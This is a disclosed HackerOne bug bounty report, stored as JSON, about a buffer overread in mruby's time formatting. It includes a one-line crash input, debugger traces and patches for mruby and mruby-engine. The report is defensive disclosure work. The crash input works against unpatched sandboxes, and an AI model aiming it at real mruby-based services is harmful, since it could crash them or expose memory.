@@ -1,0 +1,122 @@
+{
+  "id": 188326,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xODgzMjY=",
+  "url": "https://hackerone.com/reports/188326",
+  "title": "Buffer overflow in mrb_time_asctime",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2016-12-05T04:03:11.187Z",
+  "submitted_at": "2016-12-05T04:03:11.187Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "haquaman",
+    "url": "/haquaman",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/017/646/07cbfc394d4d3432eb95cf9735f225ea803090bb_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 15668,
+    "url": "https://hackerone.com/shopify-scripts",
+    "handle": "shopify-scripts",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/d9695107bfcd68eeb1c9e0912b109cdae9a6c00c0bda6fd4cbd6d9bdb828840a"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "shopify-scripts",
+      "twitter_handle": "",
+      "website": "",
+      "about": ""
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2016-12-18T13:22:13.113Z",
+  "bug_reporter_agreed_on_going_public_at": "2016-12-17T20:11:31.935Z",
+  "team_member_agreed_on_going_public_at": "2016-12-18T13:22:13.080Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi,\n\nThis one doesn't always crash every time, but with ASAN on it will.\n\nCrash file is:\n\n```\nTime.new-0XD00000000000000&0\n```\n\nBut you could always do `Time.at(sec,usec)` with special values, and basically anything that gets to_s called (`mrb_time_asctime` in C) (in this case, no method found exception does this).\n\nCrashes sometimes in mruby:\n\n```\n $ ./dev/bin/mruby crash.rb\nSegmentation fault: 11\n\n```\n\nThe times it doesn't crash, it could either return strings outside of memory with a buffer-overead. Some of the lldb runs shows this:\n\n```\n$ lldb ./dev/bin/mruby crash.rb\n(lldb) target create \"./dev/bin/mruby\"\nCurrent executable set to './dev/bin/mruby' (x86_64).\n(lldb) settings set -- target.run-args  \"crash.rb\"\n(lldb) r\nProcess 66222 launched: './dev/bin/mruby' (x86_64)\ntrace:\n        [0] crash.rb:1\ncrash.rb:1: undefined method '&' for Sun  00 16:03:04 1901 (NoMethodError)\nProcess 66222 exited with status = 1 (0x00000001)\n(lldb) r\nProcess 66665 launched: './dev/bin/mruby' (x86_64)\ntrace:\n        [0] crash.rb:1\ncrash.rb:1: undefined method '&' for Sun Jan 00 16:03:04 1900 (NoMethodError)\nProcess 66665 exited with status = 1 (0x00000001)\n(lldb) r\nProcess 66889 launched: './dev/bin/mruby' (x86_64)\ntrace:\n        [0] crash.rb:1\ncrash.rb:1: undefined method '&' for Sun Jan 00 16:03:04 1900 (NoMethodError)\nProcess 66889 exited with status = 1 (0x00000001)\n(lldb) r\nProcess 67075 launched: './dev/bin/mruby' (x86_64)\ntrace:\n        [0] crash.rb:1\ncrash.rb:1: undefined method '&' for Sun Jan 01 16:03:04 1900 (NoMethodError)\nProcess 67075 exited with status = 1 (0x00000001)\n(lldb) r\nProcess 67127 launched: './dev/bin/mruby' (x86_64)\ntrace:\n        [0] crash.rb:1\ncrash.rb:1: undefined method '&' for Sun _defined? 486 16:03:04 2259 (NoMethodError)\nProcess 67127 exited with status = 1 (0x00000001)\n(lldb) r\nProcess 67341 launched: './dev/bin/mruby' (x86_64)\ntrace:\n        [0] crash.rb:1\ncrash.rb:1: undefined method '&' for Sun Jan 04 16:03:04 1900 (NoMethodError)\nProcess 67341 exited with status = 1 (0x00000001)\n(lldb) r\nProcess 67904 launched: './dev/bin/mruby' (x86_64)\ntrace:\n        [0] crash.rb:1\ncrash.rb:1: undefined method '&' for Sun Jan 00 16:03:04 1900 (NoMethodError)\nProcess 67904 exited with status = 1 (0x00000001)\n(lldb) r\nProcess 68098 launched: './dev/bin/mruby' (x86_64)\ntrace:\n        [0] crash.rb:1\ncrash.rb:1: undefined method '&' for Sun Jan 00 16:03:04 1900 (NoMethodError)\nProcess 68098 exited with status = 1 (0x00000001)\n(lldb) r\nProcess 68320 launched: './dev/bin/mruby' (x86_64)\ntrace:\n        [0] crash.rb:1\ncrash.rb:1: undefined method '&' for Sun  01 16:03:04 1900 (NoMethodError)\nProcess 68320 exited with status = 1 (0x00000001)\n(lldb) r\nProcess 68514 launched: './dev/bin/mruby' (x86_64)\ntrace:\n        [0] crash.rb:1\ncrash.rb:1: undefined method '&' for Sun Jan 00 16:03:04 1900 (NoMethodError)\nProcess 68514 exited with status = 1 (0x00000001)\n(lldb) r\nProcess 68628 launched: './dev/bin/mruby' (x86_64)\ntrace:\n        [0] crash.rb:1\ncrash.rb:1: undefined method '&' for Sun ) 62 16:03:04 1983 (NoMethodError)\nProcess 68628 exited with status = 1 (0x00000001)\n(lldb) r\nProcess 68870 launched: './dev/bin/mruby' (x86_64)\ntrace:\n        [0] crash.rb:1\ncrash.rb:1: undefined method '&' for Sun  00 16:03:04 1901 (NoMethodError)\nProcess 68870 exited with status = 1 (0x00000001)\n(lldb) r\nProcess 68908 launched: './dev/bin/mruby' (x86_64)\ntrace:\n        [0] crash.rb:1\ncrash.rb:1: undefined method '&' for Sun  01 16:03:04 1901 (NoMethodError)\nProcess 68908 exited with status = 1 (0x00000001)\n(lldb) r\nProcess 69130 launched: './dev/bin/mruby' (x86_64)\ntrace:\n        [0] crash.rb:1\ncrash.rb:1: undefined method '&' for Sun Jan 00 16:03:04 1900 (NoMethodError)\nProcess 69130 exited with status = 1 (0x00000001)\n(lldb) r\nProcess 69324 launched: './dev/bin/mruby' (x86_64)\nProcess 69324 stopped\n* thread #1: tid = 0x88a312d, 0x00007fff95b0e152 libsystem_c.dylib`strlen + 18, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x14010ef30)\n    frame #0: 0x00007fff95b0e152 libsystem_c.dylib`strlen + 18\nlibsystem_c.dylib`strlen:\n->  0x7fff95b0e152 <+18>: pcmpeqb (%rdi), %xmm0\n    0x7fff95b0e156 <+22>: pmovmskb %xmm0, %esi\n    0x7fff95b0e15a <+26>: andq   $0xf, %rcx\n    0x7fff95b0e15e <+30>: orq    $-0x1, %rax\n(lldb) bt\n* thread #1: tid = 0x88a312d, 0x00007fff95b0e152 libsystem_c.dylib`strlen + 18, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x14010ef30)\n  * frame #0: 0x00007fff95b0e152 libsystem_c.dylib`strlen + 18\n    frame #1: 0x00007fff95b53a54 libsystem_c.dylib`__vfprintf + 5713\n    frame #2: 0x00007fff95b7c6c9 libsystem_c.dylib`__v2printf + 669\n    frame #3: 0x00007fff95b60915 libsystem_c.dylib`_vsnprintf + 596\n    frame #4: 0x00007fff95b609ca libsystem_c.dylib`vsnprintf + 80\n    frame #5: 0x00007fff95b91d08 libsystem_c.dylib`__snprintf_chk + 128\n    frame #6: 0x000000010004f15a mruby`mrb_time_asctime + 282\n    frame #7: 0x000000010003cf0b mruby`mrb_funcall_with_block + 1515\n    frame #8: 0x000000010003c901 mruby`mrb_funcall_argv + 113\n    frame #9: 0x000000010000c023 mruby`mrb_method_missing + 275\n    frame #10: 0x000000010000da7b mruby`mrb_bob_missing + 123\n    frame #11: 0x000000010003fc13 mruby`mrb_vm_exec + 6739\n    frame #12: 0x000000010003e1a7 mruby`mrb_vm_run + 135\n    frame #13: 0x0000000100046604 mruby`mrb_top_run + 100\n    frame #14: 0x0000000100071adf mruby`load_exec + 1183\n    frame #15: 0x0000000100071623 mruby`mrb_load_file_cxt + 67\n    frame #16: 0x00000001000017d8 mruby`main + 904\n    frame #17: 0x00007fff8a9db5ad libdyld.dylib`start + 1\n(lldb) register read\nGeneral Purpose Registers:\n       rax = 0x00000000ffffffff\n       rbx = 0x00000000ffffffff\n       rcx = 0x000000014010ef38\n       rdx = 0x000000014010ef38\n       rdi = 0x000000014010ef30\n       rsi = 0x00007fff95b52eb9  libsystem_c.dylib`__vfprintf + 2742\n       rbp = 0x00007fff5fbfbca0\n       rsp = 0x00007fff5fbfbca0\n        r8 = 0x0000000000000003\n        r9 = 0x000000010007f803  \"%s %02d %02d:%02d:%02d %s%d\"\n       r10 = 0x00007fffa10cd401\n       r11 = 0x00007ffe5fb713a0\n       r12 = 0x000000010007f805  \" %02d %02d:%02d:%02d %s%d\"\n       r13 = 0x0000000000000073\n       r14 = 0x0000000000000073\n       r15 = 0x0000000000000003\n       rip = 0x00007fff95b0e152  libsystem_c.dylib`strlen + 18\n    rflags = 0x0000000000010206\n        cs = 0x000000000000002b\n        fs = 0x0000000000000000\n        gs = 0x0000000000000000\n\n(lldb) q\nQuitting LLDB will kill one or more processes. Do you really want to proceed: [Y/n] y\n\n```\n\nWith some symbols compiled in:\n\n```\n$ lldb ./mruby/bin/mruby crash.rb\n(lldb) target create \"./mruby/bin/mruby\"\nCurrent executable set to './mruby/bin/mruby' (x86_64).\n(lldb) settings set -- target.run-args  \"crash.rb\"\n(lldb) r\nProcess 1457 launched: './mruby/bin/mruby' (x86_64)\nProcess 1457 stopped\n* thread #1: tid = 0x88ab040, 0x00007fff95b0e152 libsystem_c.dylib`strlen + 18, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x101946780)\n    frame #0: 0x00007fff95b0e152 libsystem_c.dylib`strlen + 18\nlibsystem_c.dylib`strlen:\n->  0x7fff95b0e152 <+18>: pcmpeqb (%rdi), %xmm0\n    0x7fff95b0e156 <+22>: pmovmskb %xmm0, %esi\n    0x7fff95b0e15a <+26>: andq   $0xf, %rcx\n    0x7fff95b0e15e <+30>: orq    $-0x1, %rax\n(lldb) up\nframe #1: 0x00007fff95b53a54 libsystem_c.dylib`__vfprintf + 5713\nlibsystem_c.dylib`__vfprintf:\n    0x7fff95b53a54 <+5713>: movq   %rax, -0x2f8(%rbp)\n    0x7fff95b53a5b <+5720>: movb   $0x0, -0x18f(%rbp)\n    0x7fff95b53a62 <+5727>: movl   $0x0, -0x304(%rbp)\n    0x7fff95b53a6c <+5737>: movl   %r14d, %r13d\n(lldb) up\nframe #2: 0x00007fff95b7c6c9 libsystem_c.dylib`__v2printf + 669\nlibsystem_c.dylib`__v2printf:\n    0x7fff95b7c6c9 <+669>: movl   %eax, %ebx\n    0x7fff95b7c6cb <+671>: jmp    0x7fff95b7c718            ; <+748>\n    0x7fff95b7c6cd <+673>: callq  0x7fff95b91fe4            ; symbol stub for: __error\n    0x7fff95b7c6d2 <+678>: movl   (%rax), %ebx\n(lldb) up\nframe #3: 0x00007fff95b60915 libsystem_c.dylib`_vsnprintf + 596\nlibsystem_c.dylib`_vsnprintf:\n    0x7fff95b60915 <+596>: testq  %rbx, %rbx\n    0x7fff95b60918 <+599>: je     0x7fff95b60924            ; <+611>\n    0x7fff95b6091a <+601>: movq   -0x1e0(%rbp), %rcx\n    0x7fff95b60921 <+608>: movb   $0x0, (%rcx)\n(lldb) up\nframe #4: 0x00007fff95b609ca libsystem_c.dylib`vsnprintf + 80\nlibsystem_c.dylib`vsnprintf:\n    0x7fff95b609ca <+80>: addq   $0x10, %rsp\n    0x7fff95b609ce <+84>: popq   %rbx\n    0x7fff95b609cf <+85>: popq   %r12\n    0x7fff95b609d1 <+87>: popq   %r14\n(lldb) up\nframe #5: 0x00007fff95b91d08 libsystem_c.dylib`__snprintf_chk + 128\nlibsystem_c.dylib`__snprintf_chk:\n    0x7fff95b91d08 <+128>: cmpq   -0x10(%rbp), %rbx\n    0x7fff95b91d0c <+132>: jne    0x7fff95b91d1d            ; <+149>\n    0x7fff95b91d0e <+134>: addq   $0xd8, %rsp\n    0x7fff95b91d15 <+141>: popq   %rbx\n(lldb)\nframe #6: 0x000000010004e8da mruby`mrb_time_asctime(mrb=0x00000001002029f0, self=mrb_value @ 0x00007fff5fbfc530) + 282 at time.c:506\n   503\n   504    tm = DATA_GET_PTR(mrb, self, &mrb_time_type, struct mrb_time);\n   505    d = &tm->datetime;\n-> 506    len = snprintf(buf, sizeof(buf), \"%s %s %02d %02d:%02d:%02d %s%d\",\n   507      wday_names[d->tm_wday], mon_names[d->tm_mon], d->tm_mday,\n   508      d->tm_hour, d->tm_min, d->tm_sec,\n   509      tm->timezone == MRB_TIMEZONE_UTC ? \"UTC \" : \"\",\n(lldb) p *tm\n(mrb_time) $0 = {\n  sec = -936748721012153088\n  usec = 105092\n  timezone = MRB_TIMEZONE_LOCAL\n  datetime = {\n    tm_sec = 12\n    tm_min = 5\n    tm_hour = 16\n    tm_mday = 1\n    tm_mon = 6484120\n    tm_year = 1\n    tm_wday = 0\n    tm_yday = 1\n    tm_isdst = 0\n    tm_gmtoff = 1701667182\n    tm_zone = 0x000a000000000000 <no value available>\n  }\n}\n(lldb) p *d\n(tm) $1 = {\n  tm_sec = 12\n  tm_min = 5\n  tm_hour = 16\n  tm_mday = 1\n  tm_mon = 6484120\n  tm_year = 1\n  tm_wday = 0\n  tm_yday = 1\n  tm_isdst = 0\n  tm_gmtoff = 1701667182\n  tm_zone = 0x000a000000000000 <no value available>\n}\n(lldb) q\nQuitting LLDB will kill one or more processes. Do you really want to proceed: [Y/n] y\n\n```\n\nPatch to fix would be this:\n\n```\ndiff --git a/mrbgems/mruby-time/src/time.c b/mrbgems/mruby-time/src/time.c\nindex dfd4450..5dc5b34 100644\n--- a/mrbgems/mruby-time/src/time.c\n+++ b/mrbgems/mruby-time/src/time.c\n@@ -238,7 +238,9 @@ time_alloc(mrb_state *mrb, double sec, double usec, enum mrb_timezone timezone)\n     tm->usec -= 1000000;\n   }\n   tm->timezone = timezone;\n-  mrb_time_update_datetime(tm);\n+  if (!mrb_time_update_datetime(tm)) {\n+    mrb_raisef(mrb, E_ARGUMENT_ERROR, \"%S out of Time range\", mrb_float_value(mrb, sec));\n+  }\n \n   return tm;\n }\n```\n\nWhich now returns:\n\n```\n$ ./mruby/bin/mruby crash.rb\n        [0] crash.rb:1\ncrash.rb:1: -9.3674872101215e+17 out of Time range (ArgumentError)\n\n```\n\n\nAlso affected `mruby-engine`:\n\n```\n$ ./bin/sandbox crash.rb\n./bin/sandbox:20: [BUG] Segmentation fault at 0x0000014531cca0\nruby 2.3.0p0 (2015-12-25 revision 53290) [x86_64-darwin15]\n\n-- Crash Report log information --------------------------------------------\n   See Crash Report log file under the one of following:\n     * ~/Library/Logs/CrashReporter\n     * /Library/Logs/CrashReporter\n     * ~/Library/Logs/DiagnosticReports\n     * /Library/Logs/DiagnosticReports\n   for more details.\nDon't forget to include the above Crash Report log file in bug reports.\n\n-- Control frame information -----------------------------------------------\nc:0003 p:---- s:0011 e:000010 CFUNC  :sandbox_eval\nc:0002 p:0214 s:0006 E:000c80 EVAL   ./bin/sandbox:20 [FINISH]\nc:0001 p:0000 s:0002 E:001810 (none) [FINISH]\n\n-- Ruby level backtrace information ----------------------------------------\n./bin/sandbox:20:in `<main>'\n./bin/sandbox:20:in `sandbox_eval'\n\n-- Machine register context ------------------------------------------------\n rax: 0x00000000ffffffff rbx: 0x00000000ffffffff rcx: 0x000000014531cca0\n rdx: 0x000000014531cca0 rdi: 0x000000014531cca0 rsi: 0x00007fff95b52eb9\n rbp: 0x00007fff528d0400 rsp: 0x00007fff528d0400  r8: 0x0000000000000003\n  r9: 0x000000010dd2a24a r10: 0x00007fffa10cd401 r11: 0x00007ffe44bac7b4\n r12: 0x000000010dd2a24c r13: 0x0000000000000073 r14: 0x0000000000000073\n r15: 0x0000000000000003 rip: 0x00007fff95b0e152 rfl: 0x0000000000010206\n\n-- C level backtrace information -------------------------------------------\n0   ruby                                0x000000010d4cb5d4 rb_vm_bugreport + 388\n1   ruby                                0x000000010d36d023 rb_bug_context + 483\n2   ruby                                0x000000010d440653 sigsegv + 83\n3   libsystem_platform.dylib            0x00007fff9826d52a _sigtramp + 26\n4   libsystem_c.dylib                   0x00007fff95b0e152 strlen + 18\n5   ???                                 0x00007fff528d07f0 0x0 + 140734578362352\n\n-- Other runtime information -----------------------------------------------\n\n* Loaded script: ./bin/sandbox\n\n* Loaded features:\n\n    0 enumerator.so\n    1 thread.rb\n    2 rational.so\n    3 complex.so\n<snip various gems>\n  185 /Users/<snip>/mruby-engine/lib/mruby_engine/mruby_engine.bundle\n  186 /Users/<snip>/mruby-engine/lib/mruby_engine.rb\n\n[NOTE]\nYou may have encountered a bug in the Ruby interpreter or extension libraries.\nBug reports are welcome.\nFor details: http://www.ruby-lang.org/bugreport.html\n\nAbort trap: 6\n\n```\n\nPatch to fix `mruby-engine`:\n\n```\ndiff --git a/ext/mruby_engine/mruby-time/src/time.c b/ext/mruby_engine/mruby-time/src/time.c\nindex 8884a5d..2b5d770 100644\n--- a/ext/mruby_engine/mruby-time/src/time.c\n+++ b/ext/mruby_engine/mruby-time/src/time.c\n@@ -236,7 +236,9 @@ time_alloc(mrb_state *mrb, double sec, double usec, enum mrb_timezone timezone)\n     tm->usec -= 1000000;\n   }\n   tm->timezone = timezone;\n-  mrb_time_update_datetime(tm);\n+  if (!mrb_time_update_datetime(tm)) {\n+    mrb_raisef(mrb, E_ARGUMENT_ERROR, \"%S out of Time range\", mrb_float_value(mrb, sec));\n+  }\n \n   return tm;\n }\n```\n\nNow returns:\n\n```\n$ ./bin/sandbox crash.rb\n./bin/sandbox:20:in `sandbox_eval': -9.3674872249306e+17 out of Time range (MRubyEngine::EngineRuntimeError)\n        from ./bin/sandbox:20:in `<main>'\n\n```\n\nCheers,\n\nHugh",
+  "bounty_amount": "10000.0",
+  "formatted_bounty": "$10,000",
+  "weakness": {
+    "id": 48,
+    "name": "Uncontrolled Resource Consumption"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2017-01-16T20:11:31.968Z",
+  "allow_singular_disclosure_after": -293742923.64362866,
+  "singular_disclosure_allowed": true,
+  "vote_count": 13,
+  "voters": [
+    "apapedulimu",
+    "madrobot",
+    "eveeez",
+    "c12316651",
+    "japz",
+    "eminfidan",
+    "spetr0x",
+    "prem1807",
+    "abhisheksingh",
+    "b4155f7c29acd42c27d007a",
+    "and 3 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "Team"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
